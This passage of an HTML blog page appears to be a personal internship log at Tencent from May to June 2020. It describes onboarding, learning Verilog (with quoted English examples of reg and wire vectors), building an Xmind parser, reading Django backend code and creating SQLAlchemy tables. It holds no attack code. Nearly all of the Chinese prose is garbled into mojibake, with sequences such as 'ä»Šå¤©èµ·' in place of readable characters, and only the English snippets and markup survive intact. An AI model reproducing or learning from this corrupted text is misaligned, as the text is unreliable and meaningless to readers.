id="2020x2f5x2f22">2020&#x2F;5&#x2F;22</span></h2><p>â€‹ä»Šå¤©èµ·äº†ä¸ªå¤§æ—©ï¼Œæ˜¨å¤©æ™šä¸Šçœ‹åœ°å›¾æ˜¾ç¤ºåˆ°å…¬å¸å·®ä¸å¤š30åˆ†é’Ÿï¼Œç„¶åææ—©èµ·æ¥ï¼Œåƒå®Œé¥­å°±å»ç­‰å…¬äº¤äº†ï¼Œæ²¡æƒ³åˆ°è·¯ä¸Šé‚£ä¸ªå µå•Šï¼Œ1å°æ—¶æ‰èµ°å®Œ4å…¬é‡Œçš„è·¯ã€‚å¿ƒæ€å‘ç”Ÿäº†ç‚¹å˜åŒ–ï¼Œå¥½åœ¨ä¸‹è½¦ç‚¹ç¦»è…¾è®¯å¤§å¦å¾ˆè¿‘ã€‚é¢†å®Œäº†ä¸´æ—¶å·¥ç‰Œä¸Šæ¥¼æ‹¿åˆ°äº†æ­£å¼å‘˜å·¥çš„å·¥ç‰Œï¼Œç„¶ååœ¨29æ¥¼ç­‰åˆ°äº†äº²çˆ±çš„å¯¼å¸ˆSongaåï¼Œå¯¼å¸ˆç»™æˆ‘å®‰æ’äº†å·¥ä½ï¼Œç”±äºäººæ¯”è¾ƒå¤šç»™æˆ‘å®‰æ’çš„æ˜¯ä¸ªä¸´æ—¶çš„å·¥ä½ã€‚ä¸è¿‡è…¾è®¯çš„æ¤…å­åèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒniceçš„ã€‚</p><p><img src="/2020/05/28/Tencent-intern-LOG/2e51e8d8f26e43a3f79bf461582f347.jpg" alt="å·¥ä½ç”µè„‘"></p><p>â€‹æ—©ä¸Šä¸»è¦æ˜¯ç†Ÿæ‚‰ä¸€ä¸‹å…¬å¸ç¯å¢ƒè¿˜æœ‰å°†å…¬å¸é…çš„ç”µè„‘è¿›è¡Œæ ‡å‡†åŒ–è®¾ç½®ã€‚ç”µè„‘é…ç½®è¿˜è›®ä¸é”™çš„i7 9700+32G+1TSSDï¼Œå…¬å¸ç½‘ä¹Ÿæ˜¯æå¿«çš„ï¼Œæˆ‘å°±è£…ä¸Šäº†chromeå¼€å§‹ä½¿ç”¨Googleï¼Œæ„Ÿè§‰çœŸçš„å®Œçˆ†äº†ç™¾åº¦ã€‚åé¢å¯¼å¸ˆè®©æˆ‘ç ”ç©¶ä¸€ä¸‹Xilinx U20çš„å¡ï¼ˆFPGAæ¶æ„ï¼‰ï¼Œä»¥åŠæ™ºèƒ½çš„ç½‘å¡DPDKã€‚</p><p>â€‹å¾ˆå¿«å°±åˆ°ä¸­åˆäº†ï¼Œå¯¼å¸ˆä¹Ÿæ˜¯å¾ˆniceçš„å’Œæˆ‘åƒäº†ä¸€ä¸‹åˆé¥­ï¼Œç„¶åå¸¦æˆ‘æºœè¾¾äº†ä¸€åœˆï¼Œè¿˜å»äº†28æ¥¼é¢†å–äº†è…¾è®¯å‘çš„å£ç½©ï¼Œè¿˜æ˜¯æ¯”äºšè¿ªç”Ÿäº§çš„ã€‚</p><p><img src="/2020/05/28/Tencent-intern-LOG/0aa79f15a16da0334e10cfedf1c85b5.jpg" alt="å£ç½©"></p><p>â€‹åƒå®Œé¥­å°±å¯ä»¥ä¼‘æ¯äº†ï¼Œä¸€èˆ¬å¤§å®¶ä»11:30å°±å¯ä»¥å‡†å¤‡å»åƒé¥­äº†ï¼Œç„¶åä¸­åˆå¯ä»¥ä¼‘æ¯åˆ°2ç‚¹ï¼Œä¸»è¦æˆ‘ä¹Ÿæ¯”è¾ƒéš¾ä»¥å…¥ç¡ï¼Œä¸€å¤©é ä¸¤æ¯æ‹¿é“åº¦è¿‡äº†ã€‚åé¢Leaderä¹Ÿæ˜¯å¸¦æˆ‘å»è§äº†ä¸€é¢æ€»ç›‘ï¼Œç„¶åç»™æˆ‘ä»‹ç»äº†ä¸€ä¸‹ç»„é‡Œé¢çš„æƒ…å†µï¼Œä»¥åŠ30TB&#x2F;sæµé‡çš„ç›‘æ§å¹³å°â€”â€”å¤©å¹•ï¼Œç›‘æ§äº†è…¾è®¯ç™¾åˆ†ä¹‹98çš„æµé‡ï¼Œå¯è°“æ˜¯ååˆ†å¼ºå¤§äº†ã€‚åé¢å’Œå¯¼å¸ˆäº¤æµäº†ä¸€ä¸‹æˆ‘çš„åŸ¹å…»è®¡åˆ’ï¼Œå‘ç°å°ç¨‹åºé‚£éƒ¨åˆ†å†…å®¹å…¶å®æœ‰å›¢é˜Ÿåšå®Œäº†ã€‚çœ‹æ¥æˆ‘å¿…é¡»ç›´é¢æˆ‘æœ€è–„å¼±çš„ç‚¹ã€‚æˆ‘æœ¬æ¥æ˜¯åšJavaåä¸Šå±‚åº”ç”¨çš„ï¼Œæ²¡æƒ³åˆ°è¦è½¬C++æ¥å¼€å‘åº•å±‚çš„ç¡¬ä»¶äº†ã€‚è€Œä¸”å…¨ç»„å”¯ä¸€æœ‰FPGAç»éªŒçš„å¤§ä½¬è¿˜è¢«å½“ä½œæ•‘å…µå»æ•‘æ€¥äº†ã€‚ å“ˆå“ˆå“ˆï¼Œå¦‚æœè½¬å‹æˆåŠŸé‚£å°±ç›¸å½“äºå‡¤å‡°æ¶…æ§ƒäº†ï¼Œæ—¢æ˜¯æœºé‡ä¹Ÿæ˜¯æŒ‘æˆ˜ã€‚</p><p>â€‹å› æ­¤æˆ‘ç¬¬ä¸€å¤©å…¶å®æ„Ÿå—åˆ°å‹åŠ›è¿˜æ˜¯è›®å¤§çš„ï¼Œç„¶åç¬¬ä¸€å¤©å°±æ”¶åˆ°äº†ä¸‹åˆèŒ¶çš„ç¦åˆ©ï¼Œå¯¼å¸ˆç»™äº†æˆ‘ä¸€ä»½æ°´æœæä¸€ä»½ç”˜éœ²ï¼Œçœ‹æ¥é¹…åœºç¦åˆ©è¿˜æ˜¯åä¸è™šä¼ çš„ã€‚é™¤æ­¤ä¹‹å¤–è¿˜æœ‰æŠ«è¨å’Œé¸¡å—å“ˆå“ˆå“ˆã€‚æ–‡å…·ã€çº¸å·¾å•¥çš„ä¹Ÿæ˜¯éšä¾¿æ‹¿ï¼Œæ€»çš„æ¥è¯´è…¾è®¯æä¾›äº†ä¸€ä¸ªç‰¹åˆ«Niceçš„å·¥ä½œç¯å¢ƒå’Œå·¥ä½œæ°›å›´ï¼Œå¦‚æœé€‚åº”äº†å…¶å®æ„Ÿè§‰ä¸åˆ°ç´¯ã€‚</p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200523100708719.png" alt="ä¸‹åˆèŒ¶"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200523100747548.png" alt="ç¦åˆ©"></p><p>â€‹è™½ç„¶åšçš„ä¸œè¥¿æˆ‘éƒ½æ²¡æœ‰ä»»ä½•çš„ç»éªŒï¼Œæˆ‘è¿˜æ˜¯ç›¸ä¿¡è‡ªå·±çš„æ”»åšèƒ½åŠ›çš„ï¼Œå¥½å¥½åŠ æ²¹äº‰å–èƒ½å…ˆå…¥ä¸ªé—¨ï¼Œç­‰å…¥é—¨äº†å°±ä¼šè½»æ¾ä¸€ç‚¹äº†ã€‚</p><p>â€‹åé¢æ˜¯æ‰“ç®—å·¥ä½œåˆ°8ç‚¹åç„¶ååœ¨å…¬å¸é‡Œé¢å¥èº«ï¼Œç„¶åæ‰“è½¦å›å®¶å’¯ï¼Œä»Šå¤©å’Œå¥½åŸºå‹å‡ºå»æ°äº†ä¸ªé¥­ç„¶åå°±å›æ¥äº†ã€‚</p><p>â€‹è¦è¯´ä¸€ç‚¹ä¼ä¸šå¾®ä¿¡è¿˜æ˜¯æ¯”é’‰é’‰äººæ€§åŒ–ï¼Œè™½ç„¶è¯´é’‰é’‰æ˜¯ä¸ºä¼ä¸šæœåŠ¡å®Œå…¨ä¸éœ€è¦è€ƒè™‘ä½ å‘˜å·¥çš„ä½“éªŒï¼Œä½†æ˜¯æˆ‘è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢è…¾è®¯çš„ä¼ä¸šå¾®ä¿¡çš„ï¼Œå¤šäº†ä¸€äº›äººæ€§çš„å…³æ€€å§ã€‚</p><p>â€‹è…¾è®¯çš„ç‘é›ªæ–‡åŒ–æˆ‘ä¹Ÿç‰¹åˆ«çš„å–œæ¬¢ï¼Œç›¸æ¯”ç™¾åº¦å…¶å®æˆ‘å¿ƒä¸­çš„Dream Companyå°±æ˜¯è…¾è®¯äº†ã€‚å¸Œæœ›è‡ªå·±èƒ½å°½å¿«çš„èå…¥å›¢é˜Ÿå§ã€‚</p><h2><span id="2020x2f5x2f25">2020&#x2F;5&#x2F;25</span></h2><ul><li><p>æ—©ä¸Šå»æ»¨æµ·å¤§å¦é€åˆåŒï¼Œé¡ºä¾¿å‚è§‚äº†ä¸€ä¸‹å¤§æ¥¼ã€‚</p></li><li><p>è°ƒç ”FPGAçš„æ•°å­—ç”µè·¯è®¾è®¡è¯­è¨€ï¼ˆåˆ†åˆ«æœ‰Verilog HDLå’ŒVHDLï¼Œå›½å†…å’Œæ¬§ç¾ä½¿ç”¨Verilogæ¯”è¾ƒå¤šï¼Œæ¬§æ´²ä½¿ç”¨VHDLæ¯”è¾ƒå¤šã€‚é€šå¸¸åœ¨å°å‹ä¸­å‹è®¾è®¡çš„æ—¶å€™ä½¿ç”¨Verilogï¼Œå› ä¸ºå…¶ç‰¹æ€§æ¯”è¾ƒçµæ´»ã€‚åœ¨å¤§å‹çš„è®¾è®¡ä¸­ä½¿ç”¨VHDLæ¯”è¾ƒå¤šï¼Œå› ä¸ºå…¶ä»¥ä¸¥è°¨æ€§è‘—ç§°ã€‚ï¼‰</p></li><li><p>ä½¿ç”¨æœç´¢å¼•æ“æœç´¢ç›¸å…³æ•™ç¨‹,å¼€å§‹å­¦ä¹ Verilog HDLè¯­è¨€ã€‚</p><blockquote><p>â€‹å­¦ä¹ äº†ä»€ä¹ˆæ˜¯Verilog HDL</p><p>â€‹å­¦ä¹ äº†æ¨¡å—ã€æ—¶å»¶å’Œè®¾è®¡çš„è¡¨è¿°æ–¹å¼</p><p>â€‹å­¦ä¹ äº†æ ‡è¯†ç¬¦ã€æ³¨é‡Šã€æ ¼å¼ã€ç¼–è¯‘å‘½ä»¤å’Œç³»ç»Ÿä»»åŠ¡ä¸å‡½æ•°</p></blockquote></li><li><p>äº†è§£Xmindåå°é¡¹ç›®</p></li><li><p>ç ”ç©¶äº†Xmindçš„pythonåŒ…ï¼Œä½†æ˜¯å­˜åœ¨ç€æ— æ³•å’Œæœ€æ–°ç‰ˆxmindè½¯ä»¶å…¼å®¹çš„é—®é¢˜ã€‚</p></li><li><p>æ™šä¸Šå®åœ°æ¢å‹˜äº†ç­è½¦ï¼Œå¹¶ä½“éªŒäº†è…¾è®¯ç­è½¦ã€‚</p></li></ul><h2><span id="2020x2f5x2f26">2020&#x2F;5&#x2F;26</span></h2><ul><li><p>å­¦ä¹ Verilog HDLè¯­è¨€</p><blockquote><p>å­¦ä¹ äº†å€¼é›†åˆã€æ•°æ®ç±»å‹ã€è¡¨è¾¾å¼ã€é—¨ç”µå¹³æ¨¡å‹åŒ–ã€‚</p></blockquote><p>è®°å½•ä¸€ä¸‹Verilogè¯­è¨€ä¸­çš„ reg[MSB:LSB] aï¼Œå…¶ä¸­aå¯„å­˜å™¨çš„ä½æ•°ä¸ºMSB-LSB+1ï¼Œä¸”å…¶ä¸­çš„aæ˜¯æ— ç¬¦å·æ•´æ•°ï¼Œå¼•ç”¨å®˜ç½‘æ–‡æ¡£ï¼š</p><p>Vectors can be declared for all types of <strong>net</strong> data types and for <strong>reg</strong> data types. Specifying vectors for <strong>integer</strong>, <strong>real</strong>, <strong>realtime</strong>, and <strong>time</strong> data types is illegal.</p><h2><span id="examples">Examples</span></h2><p>Example 1</p><p><strong>reg</strong> [3:0] addr;</p><p>The â€˜addrâ€™ variable is a 4-bit vector register made up of addr[3] (the most significant bit), addr[2], addr[1], and addr[0] (the least significant bit).</p><p>Example 2</p><p><strong>wire</strong> [-3:4] d;</p><p>The d variable is 8-bit vector net made up of d[-3] (msb), d[-2], d[-1], d[0], d[1], d[2], d[3], d[4] (lsb).</p><p>Example 3</p><p><strong>tri</strong> [5:0] x, y, z;</p><p>The above line declares three 6-bit vectors.   </p><p>è®°å½•ä¸€ä¸‹assignçš„æ„ä¹‰ï¼Œæœ‰æ—¶å€™ç”¨assignæœ‰æ—¶å€™ç›´æ¥èµ‹å€¼ï¼š</p><blockquote><p>The <strong>assign</strong> construct in Verilog is the <strong>continuous</strong> assignment statement in Verilog which is used in <strong>dataflow</strong> modelling.</p></blockquote></li><li><p>å…¬å¸çš„ç½‘å¥½åƒç”¨pipå’Œnpmä¸‹è½½ä¸€äº›åŒ…ä»¥åŠå®‰è£…ä¸€äº›è½¯ä»¶éƒ½è£…ä¸ä¸Šã€‚</p></li><li><p>ä¸‹åˆå¼€å§‹è®¤çœŸçœ‹Xmindé¡¹ç›®çš„éœ€æ±‚ï¼Œä¸€å¼€å§‹æ²¡ä»€ä¹ˆå¤´ç»ªï¼Œæ™šä¸Šå†™å®Œä»£ç æµ‹è¯•äº†ä¸€ä¸‹å±‚æ¬¡éå†å’Œå‰åºéå†ï¼Œå†³å®šä½¿ç”¨å±‚æ¬¡éå†çš„æ–¹æ³•ã€‚</p></li><li><p>æ™šä¸Šæƒ³åˆ°æ–¹æ³•åä¸€ç›´ç¡ä¸ç€ï¼Œè®°å½•äº†ä¸€ä¸‹æ‰€æ€è€ƒçš„æ€è·¯ã€‚</p></li></ul><h2><span id="2020x2f5x2f27">2020&#x2F;5&#x2F;27</span></h2><ul><li><p>æ—©ä¸Šè¿˜æ˜¯æ—©æ—©çš„èµ·æ¥æ­ä¹˜ç­è½¦åˆ°å…¬å¸</p></li><li><p>ä¸€è¾¹è°·æ­Œä¸€è¾¹codingæŠŠæˆ‘çš„æƒ³æ³•å®ç°äº†ï¼Œåº”è¯¥æ˜¯é—®é¢˜ä¸å¤§ã€‚</p></li><li><p>ä¸‹åˆï¼Œæ„æ€äº†ä¸€ä¸‹å¤æ‚æ¨¡æ¿çš„è®¾è®¡å’Œè§„èŒƒï¼Œæœ€ç»ˆå®ç°äº†ä¸€ä¸ªdemo</p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213647495.png" alt="ç®€åŒ–ç‰ˆxmind"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213710782.png" alt="å¤„ç†å®Œçš„ç»“æœ"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213736644.png" alt="å¤æ‚ç‰ˆæœ¬xmind"></p><p><img src="/2020/05/28/Tencent-intern-LOG/image-20200527213757782.png" alt="å¤„ç†åçš„ç»“æœ"></p></li><li><p>ç»§ç»­å­¦ä¹ Verilog</p><blockquote><p> ç»„åˆç”µè·¯ä¸æ—¶åºç”µè·¯</p></blockquote></li><li><p>æ™šä¸Šå’Œä¸­å¿ƒçš„äººæ‰“ç¯®çƒï¼Œæ‰“å®Œåä¸€èº«æ±—ä¸æ–¹ä¾¿åå¤§å·´ç´¢æ€§éª‘è½¦å›é…’åº—</p></li><li><p>æ„Ÿè§‰è¿™æ ·çš„ç”Ÿæ´»è¿˜æ˜¯è›®èˆ’æœçš„ï¼Œè™½ç„¶è¯´å¤§åŸå¸‚ç»™äºˆè‡ªå·±çš„æ—¶é—´å˜å°‘äº†ï¼Œä½†æ˜¯å…¬å¸çš„æ°›å›´éƒ½ç‰¹åˆ«èæ´½ï¼Œæ…¢æ…¢æ„Ÿå—åˆ°äº†ç‘é›ªæ–‡åŒ–ã€‚è¶Šå‘çš„æƒ³ç•™åœ¨è…¾è®¯äº†ï¼Œæˆ‘ä¹Ÿæ˜¯è¶Šæ¥è¶Šå¥½ï¼Œè¶Šæ¥è¶Šè‡ªä¿¡äº†ã€‚</p></li></ul><h2><span id="2020x2f5x2f28">2020&#x2F;5&#x2F;28</span></h2><ul><li><p>æŒ‰ç…§éœ€æ±‚ä¿®æ”¹Xmind</p><blockquote><p>ä¿®æ”¹äº†ä»£ç å®ç°æ ‡ç­¾è¿½åŠ åŠŸèƒ½</p><p>å¢åŠ äº†é»˜è®¤æƒé™ä¸º0çš„æ“ä½œ</p><p>ä¿®æ”¹ä»£ç å®ç°äº†æŒ‰é¡ºåºæ·»åŠ å±æ€§åŠŸèƒ½</p><p>å®ç°äº†åŒºåˆ†ç”¨ä¾‹æ ‡é¢˜å’Œå±æ€§</p></blockquote><p>ä½†æ˜¯å¾ˆé—æ†¾çš„æ˜¯xmindåŒ…ä¸æ”¯æŒxmind zenç‰ˆæœ¬</p><p>å› æ­¤æˆ‘å†³å®šæ”¹å˜ä¸€ä¸ªæ€è·¯ï¼Œå»æ‰¾æœ‰æ²¡æœ‰å°†zenè½¬ä¸ºjsonçš„åŒ…ï¼Œå¹¶ä¸”å¯¹jsonè¿›è¡Œå±‚æ¬¡éå†ï¼Œè¿™æ ·è™½ç„¶æ•ˆç‡ä½äº†ä½†æ˜¯ä¹Ÿèƒ½å®ç°åŠŸèƒ½ï¼Œä»£ç ä¹Ÿå¯ä»¥å¤ç”¨ã€‚</p></li><li><p>ç»§ç»­å­¦ä¹ Verilog</p><blockquote><p>æ•°æ®æµæ¨¡å‹åŒ–</p></blockquote></li><li><p>é¡¹ç›®ç»ç†è®©æˆ‘å¸®é»„åšå¯¹æ¥ä¸€ä¸‹AI LAB</p></li><li><p>æ™šä¸Šå¥èº«+éª‘è½¦å›é…’åº—</p></li></ul><h2><span id="2020x2f5x2f29">2020&#x2F;5&#x2F;29</span></h2><ul><li>ç»§ç»­ç ”ç©¶å¦‚ä½•è§£æXmind</li><li>æ”¾å¼ƒäº†è‡ªå·±å†™çš„è§£æä»£ç ï¼ŒæŸ¥è¯¢äº†ç›¸å…³æ–‡æ¡£ä½¿ç”¨äº†jsonåº“è‡ªå¸¦çš„åŠŸèƒ½ã€‚</li><li>å®Œæˆäº†å¯¹JSONçš„è§£æï¼Œå¹¶ä¸”å°†ç»“æœå°è£…æˆå¯¹è±¡ã€‚</li><li>é»˜è®¤ä¸€ä¸ªZENæ–‡æ¡£ä¸€ä¸ªç”»å¸ƒ</li><li>ä¸ºäº†ä»£ç å¯è¯»æ€§ã€ç»´æŠ¤æ€§å’Œå¼€å‘çš„ä¾¿æ·æ€§ï¼Œç‰ºç‰²ä¸€ä¸¢ä¸¢æ€§èƒ½ï¼Œå°†è§£æXmindå•ç‹¬å†™æˆä¸€ä¸ªæ–‡ä»¶ã€‚</li><li>å®Œæˆå¯¹JSONæ–‡ä»¶çš„è§£æç”Ÿæˆæ¨¡å‹èŠ‚ç‚¹ï¼Œå¹¶ä¸”å¯¹æ¨¡å‹èŠ‚ç‚¹è§£æï¼Œç»“åˆæˆ‘ä¹‹å‰çš„è§£æä»£ç æŠŠæ•´ä¸ªXmindæ–‡ä»¶æŒ‰æ ¼å¼è§£æå‡ºæ¥ã€‚</li></ul><h2><span id="2020x2f6x2f1">2020&#x2F;6&#x2F;1</span></h2><ul><li><p>ç»§ç»­å­¦ä¹ Verilog</p><blockquote><p> å­¦ä¹ äº†è¡Œä¸ºå»ºæ¨¡ ç»“æ„å»ºæ¨¡</p></blockquote></li><li><p>Xmind è§£æé¡¹ç›®</p><blockquote><p>ä¼˜åŒ–Xmindè§£æç®—æ³•ï¼Œæ·»åŠ æ³¨é‡Šï¼ŒåŠ å…¥å¤šç”»å¸ƒæ”¯æŒã€‚</p><p>åˆ é™¤å†—ä½™ä»£ç ï¼Œå‡å°‘ç©ºé—´å¤æ‚åº¦ã€‚</p><p>å¼€ä¼šè®¨è®ºä¸‹ä¸€æ­¥è®¡åˆ’ï¼š</p></blockquote><blockquote><pre><code>    1.  è§£æç›®å½•    2.  è½¬æ¢æˆå…¶ä»–å¯¹è±¡    3.  å®¹é”™å’Œæ ¡éªŒ</code></pre></blockquote></li><li><p>å®Œæˆè§£æç›®å½•å’Œç»“æœé›†è½¬åŒ–ä¸ºNodeDOListå¯¹è±¡ï¼Œå…ƒç´ è½¬åŒ–ä¸ºNodeDOå¯¹è±¡ã€‚</p></li></ul><h2><span id="2020x2f6x2f2">2020&#x2F;6&#x2F;2</span></h2><ul><li><p>Xmindè§£æï¼š</p><blockquote><p>ä¿®å¤äº†å¤šæ¬¡è®¾ç½®å±æ€§çš„bug</p><p>æ·»åŠ äº†å¯¹ä¼˜å…ˆçº§çš„åˆ¤é”™ï¼š</p><p>â€‹å¦‚æœæ˜¯påæ•°å­—å¤§äº3å°äº0å°±æŠ¥é”™</p><p>â€‹å¦‚æœæ˜¯æ ‡ç­¾æ²¡åŠ #åˆ™åˆ¤é”™ï¼Œå¦‚æœåœ¨ä¼˜å…ˆçº§åå†™æ ‡ç­¾æ²¡åŠ |åˆ™æŠ¥é”™</p><p>å®¹é”™ï¼š</p><p>â€‹å¦‚æœæ˜¯å°å†™på¼€å¤´å°±è½¬åŒ–æˆå¤§å†™P</p><p>ä¼˜åŒ–äº†ä»£ç ï¼Œä½¿ç”¨ä¸€ä¸ªçˆ¶ç±»æå–èŠ‚ç‚¹åŸºæœ¬å±æ€§åŒæ—¶ä¸¤ä¸ªå­ç±»title_nodeå’Œexample_nodeç»§æ‰¿çˆ¶ç±»Node</p><p>åŸºæœ¬å®Œæˆå¯¹Xmindè§£æçš„å¼€å‘</p></blockquote></li><li><p>é˜…è¯»DjangoæœåŠ¡å™¨çš„ä»£ç ï¼Œä¸ºå¼€å‘åå°åŠŸèƒ½åšå‡†å¤‡ã€‚</p><ul><li><p>upload_file</p><blockquote><p>æµç¨‹ï¼š</p><p>â€‹è¯»å–åˆ°ä¸Šä¼ çš„æ–‡ä»¶</p><p>â€‹ç”Ÿæˆuuidå¹¶æŠŠâ€œ-â€å»é™¤</p><p>â€‹ç¼“å­˜åˆ°æœ¬åœ°</p><p>â€‹ä¸Šä¼ åˆ°æœåŠ¡å™¨</p><p>â€‹ å°†ä¿¡æ¯è¿”å›å‰ç«¯</p></blockquote></li><li><p>parse_task_status</p><blockquote><p> è·å– è·å–æäº¤çš„è§£æä»»åŠ¡ å’Œ è·å–æäº¤çš„ç”¨ä¾‹å¤„ç†ä»»åŠ¡çš„çŠ¶æ€ è¿”å›å‰ç«¯</p></blockquote></li></ul></li><li><p>æå‰è¯·å‡ä»é…’åº—æ¬åˆ°ç§Ÿæˆ¿é‚£é‡Œäº†ï¼Œä»Šå¤©åˆšå¥½çŠ¶æ€ä¸è¡Œï¼Œæ—©ç‚¹å›å»äº†ã€‚ç§Ÿæˆ¿è¿˜å¯ä»¥ï¼Œåä¸ªåœ°é“å°±åˆ°å…¬å¸äº†ï¼Œç»ˆäºä¸éœ€è¦é‚£ä¹ˆæ—©èµ·äº† å“ˆå“ˆå“ˆã€‚ç§Ÿæˆ¿æ¡ä»¶ä¸­è§„ä¸­çŸ©å§ã€‚</p></li></ul><h2><span id="2020x2f6x2f3">2020&#x2F;6&#x2F;3</span></h2><ul><li><p>ç»§ç»­é˜…è¯»Djangoåå°æºç </p><ul><li><p>parse_usecase_list</p><blockquote><p>è§£æç”¨ä¾‹åˆ—è¡¨åŒ…å«ï¼š</p><p>â€‹è·å–åŒ…å«ç”¨ä¾‹çš„ä¸ªæ•°ï¼Ÿ</p><p>â€‹è·å–ä¼ å…¥å‚æ•°æ‰€å¯¹åº”çš„ç”¨ä¾‹ä¿¡æ¯</p><p>è¿”å›</p></blockquote></li><li><p>update_usecase_content</p><blockquote><p> æ›´æ–° ç”¨ä¾‹å†…å®¹</p><p> åˆ¤æ–­ç”¨ä¾‹æ˜¯å¦ä¸ºè‡ªåŠ¨åŒ–æ ·ä¾‹ æ˜¯çš„è¯å°±éœ€è¦å»åšä¸€äº›åˆæ³•æ€§åˆ¤æ–­</p></blockquote></li><li><p>data_import</p><blockquote><p>åˆ¤æ–­æ˜¯å¦æ›¾ç»å†™è¿‡æ•°æ® å†™è¿‡å°±è¿”å›ï¼Œæ²¡å†™è¿‡å°±åˆ›å»ºå¯¹è±¡ç„¶åå¼‚æ­¥å†™DB</p></blockquote></li><li><p>data_import_status</p><blockquote><p>è¿”å›ä¸Šä¼ æ–‡ä»¶åçš„ç»“æœ</p></blockquote></li><li><p>import_task_history</p><blockquote><p>è·å–å½“å‰ç™»å½•äººæäº¤çš„å¯¼å…¥ä»»åŠ¡åˆ—è¡¨</p></blockquote></li><li><p>auto_fileupload</p><blockquote><p>é€»è¾‘å’Œauto_fileuploadå·®ä¸å¤š å¤„ç†ä¸€äº›å­—æ®µä¸å¤§ä¸€æ ·</p></blockquote></li><li><p>auto_extra_params</p><blockquote><p>è·å–å…³è”çš„æ™ºç ”é¡¹ç›®ä¿¡æ¯ å¹¶ä¸” æ›´æ–°ä»»åŠ¡çŠ¶æ€å’Œä¿¡æ¯</p></blockquote></li><li><p>auto_task_history</p><blockquote><p>è·å–gitè‡ªåŠ¨æ“ä½œçš„ä»»åŠ¡è®°å½•åˆ—è¡¨</p></blockquote></li><li><p>auto_task_history_details</p><blockquote><p>è·å–gitè‡ªåŠ¨æ“ä½œ,æŒ‡å®šä»»åŠ¡çš„ç”¨ä¾‹è®°å½•è¯¦æƒ…åˆ—è¡¨</p></blockquote></li></ul></li><li><p>å¼€ä¼šï¼Œå•†é‡å¤©å¹•åå°æ•°æ®è§£æå’Œå¯è§†åŒ–åŠŸèƒ½ã€‚</p></li></ul><h2><span id="2020x2f6x2f4">2020&#x2F;6&#x2F;4</span></h2><ul><li><p>äº†è§£äº†ä¸€ä¸‹pythonè¿æ¥æ•°æ®åº“çš„å„ç§åŒ…ä»¥åŠç›¸å…³çš„ORMåŒ…ã€‚</p></li><li><p>å¼€ä¼šäº†è§£äº†ä¸€ä¸‹é€»è¾‘å’Œéœ€æ±‚ã€‚</p></li><li><p>æŸ¥çœ‹æ•°æ®åº“å¹¶ä¸”åˆ†æå“ªäº›æ•°æ®æ®µç¼ºå¤±ï¼Œå“ªäº›æ•°æ®æ®µéœ€è¦ã€‚</p></li></ul><h2><span id="2020x2f6x2f5">2020&#x2F;6&#x2F;5</span></h2><ul><li><p>ç»§ç»­åˆ†æéœ€æ±‚å’Œç ”ç©¶æ•°æ®åº“</p></li><li><p>æŸ¥æ‰¾ç¼ºå¤±çš„å­—æ®µã€‚</p></li><li><p>è§£å†³äº†sqlachemyè¿æ¥æ•°æ®åº“çš„é—®é¢˜ï¼ˆenumå­—æ®µï¼‰</p></li></ul><h2><span id="2020x2f6x2f8">2020&#x2F;6&#x2F;8</span></h2><ul><li><p>å’Œwaineæœ€åç¡®å®šéœ€æ±‚ï¼š</p></li><li><p>é€šè¿‡Excelç¡®å®šäº†æ— æ³•è·å–çš„æ•°æ®ï¼Œå¹¶ä¸”åé¦ˆç»™åŒäº‹ã€‚</p></li><li><p>ç»§ç»­ç ”ç©¶sqlAchemyï¼Œå®ç°äº†ï¼š</p><blockquote><p>å¯¹BIGINTçš„æ”¯æŒ</p><p>å¯¹è¡¨å­˜åœ¨ä¸å¦åˆ¤æ–­</p><p>åˆ›å»ºéƒ¨åˆ†æ•°æ®åº“</p><p>å®Œæˆå¯¹å›­åŒºï¼Œäº¤æ¢æœºï¼ŒæœåŠ¡å™¨è¡¨çš„å»ºç«‹ã€‚</p><p>å®Œæˆäº†yamlé…ç½®æ–‡ä»¶çš„ä¹¦å†™</p></blockquote></li></ul><h2><span id="2020x2f6x2f9">2020&#x2F;6&#x2F;9</span></h2><ul><li><p>è§£å†³äº†pythonä¸€ä¸ªå¥‡æ€ªçš„bugï¼ˆåˆ›å»ºå¯¹è±¡çš„æ—¶å€™è¿˜æ˜¯å¾—åŠ ï¼ˆï¼‰ï¼‰</p></li><li><p>å¼€å‘éœ€æ±‚</p><blockquote><p>å®Œæˆäº†å°†å·²çŸ¥æ•°æ®å½•å…¥IDCçŠ¶æ€è¡¨çš„åŠŸèƒ½</p><p>å®Œæˆäº†å°†å·²çŸ¥æ•°æ®å½•å…¥ServerçŠ¶æ€è¡¨çš„åŠŸèƒ½</p><p>å®Œæˆäº†å°†å·²çŸ¥æ•°æ®å½•å…¥switchçŠ¶æ€è¡¨çš„åŠŸèƒ½</p></blockquote></li><li><p>æ ‘ç«‹æµç¨‹ï¼š</p><blockquote><ol><li><p>å¯¹æ•°æ®è¡¨è¿›è¡Œåˆ†æï¼Œå¹¶æŠ½å–æœ‰ç”¨çš„æ•°æ®é¡¹</p></li><li><p>å¯¹æœ‰ç”¨çš„æ•°æ®è¡¨å»ºç«‹domain objectå®ç°å¯¹è±¡å’Œæ•°æ®åº“ä¹‹é—´çš„æ˜ å°„</p></li><li><p>ä¹¦å†™ä¸šåŠ¡é€»è¾‘ï¼Œå°†è¡¨æ•°æ®æœ‰æœºç»“åˆåœ¨ä¸€èµ·</p></li><li><p>ä¹¦å†™æµ‹è¯•æ ·ä¾‹ï¼Œæµ‹è¯•ä¸šåŠ¡é€»è¾‘çš„æ­£ç¡®æ€§ã€‚</p></li><li><p>å¯¹ä»£ç è¿›è¡Œå•æœºæµ‹è¯•</p></li><li><p>æ ¸å¯¹éœ€æ±‚ï¼Œçœ‹çœ‹æ˜¯å¦èƒ½æ»¡è¶³æ ‡å‡†</p></li><li><p>å¯¹ä»£ç Reviewï¼Œä¼˜åŒ–ä»£ç ï¼ˆORMéƒ¨åˆ†ä¼˜åŒ–ï¼Ÿï¼‰</p></li><li><p>å°†ä»£ç éƒ¨ç½²åˆ°æœåŠ¡å™¨ä¸Šï¼Œè¿›è¡Œæµ‹è¯•</p></li><li><p>é¡¹ç›®è¿­ä»£</p></li></ol></blockquote></li></ul><h2><span id="2020x2f6x2f10">2020&#x2F;6&#x2F;10</span></h2><ul><li><p>æŠ½å–ä»£ç  